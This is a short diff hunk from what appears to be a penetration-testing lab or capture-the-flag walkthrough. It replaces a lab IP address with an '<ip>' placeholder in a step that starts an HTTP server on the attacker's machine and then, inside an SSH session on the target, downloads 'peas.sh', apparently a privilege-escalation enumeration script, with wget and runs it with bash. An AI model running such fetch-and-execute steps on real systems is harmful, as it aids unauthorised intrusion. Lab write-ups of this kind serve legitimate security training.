@@ -161,7 +161,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 in ssh session:
 ```shell
-wget http://192.168.49.89:8000/peas.sh
+wget http://<ip>:8000/peas.sh
 ```
 ```shell
 bash peas.sh
